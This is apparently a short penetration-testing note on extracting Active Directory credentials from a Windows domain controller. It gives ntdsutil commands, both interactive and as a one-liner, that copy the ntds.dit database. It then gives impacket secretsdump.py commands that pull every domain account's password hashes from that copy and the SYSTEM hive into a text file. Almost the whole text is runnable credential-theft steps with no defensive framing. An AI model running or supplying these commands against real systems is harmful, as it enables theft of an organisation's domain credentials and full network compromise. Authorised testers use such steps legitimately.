Dump the ntds file using built in windows commands. Create folder C:\pentest first just to be sure, but it usually creates it if needed. Use an alternative path if no write permission on C:\ (but you should have admin anyway, so permissiosn aren't a thing are they?)
```
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```
or in one line
```
ntdsutil 'activate instance ntds' ifm 'create full c:\test' quit quit
```

Using sidaf/pentest/impacket - we dump the secrets from the extracted ntds.dit file:
```
secretsdump.py -ntds <PATH TO NTDS.DIT> -system <PATH TO SYSTEM> local
```

So probably:
```
secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM local > ntdsdump.txt
```
